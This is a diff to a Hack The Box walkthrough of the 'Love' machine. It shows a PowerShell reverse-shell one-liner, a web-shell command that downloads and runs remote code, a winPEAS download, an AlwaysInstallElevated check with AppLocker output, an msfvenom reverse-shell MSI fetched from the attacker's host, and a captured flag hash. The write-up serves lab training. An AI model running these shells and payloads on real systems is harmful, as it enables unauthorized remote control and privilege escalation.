@@ -158,7 +158,7 @@ view-source:http://www.love.htb/images/haxez.php?cmd=type%20C:\Users\phoebe\Desk
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ca9e7228-0129-4641-b8de-e55fdbcb32bf)
 
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.20',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
@@ -173,3 +173,99 @@ http://www.love.htb/images/haxez.php?cmd=powershell "IEX(New-Object Net.WebClien
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1ec3e109-917f-4518-9f71-ef2a75a49ae3)
 
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/409aecae-9bd9-47b1-b451-d8b16f8dc289)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fdb33817-9b86-4a1a-ab4d-8de801358047)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b074e1fc-0b1a-4a59-b96a-f33ecdbbadaf)
+
+```
+curl 10.10.16.20:8000/winPEASany_ofs.exe -o C:/Users/Public/win.exe
+```
+
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/037c5138-c7a5-46f3-ab72-ddab56ac9b5e)
+
+```
+get-applockerpolicy -effective | select -expandproperty rulecollections
+```
+
+```
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
+Name                : (Default Rule) All digitally signed Windows Installer files
+Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\Installer\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 5b290184-345a-4453-b184-45305f6d9a54
+Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
+Description         : Allows members of the Everyone group to run all Windows Installer files located in 
+                      %systemdrive%\Windows\Installer.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*.*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
+Name                : (Default Rule) All Windows Installer files
+Description         : Allows members of the local Administrators group to run all Windows Installer files.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+PathConditions      : {%OSDRIVE%\*}
+PathExceptions      : {%OSDRIVE%\Administration\*}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 7eadbece-51d4-4c8b-9ab5-39faed1bd93e
+Name                : %OSDRIVE%\*
+Description         : 
+UserOrGroupSid      : S-1-1-0
+Action              : Deny
+
+PathConditions      : {%OSDRIVE%\Administration\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
+Name                : %OSDRIVE%\Administration\*
+Description         : 
+UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
+Action              : Allow
+```
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=443 -f msi -o reverse.msi
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b9d4f99b-de12-4acb-8a9f-31225b624e43)
+
+```
+wget 10.10.16.20/reverse.msi -o reverse.msi
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/962ab956-5eb5-496a-9605-71079f0a4ae5)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5a6fdb04-ed55-4dc6-a1a5-866a1b5e3abe)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1a2a161e-9c9f-4d47-901c-98cb3008d7f1)
+
+```
+2352ff7a80b39e926181927760a724f5
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31070ee6-6b49-4012-b775-f548e5465bce)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1edf6353-d4c2-4b88-9fb0-e6f13ef2d4ca)
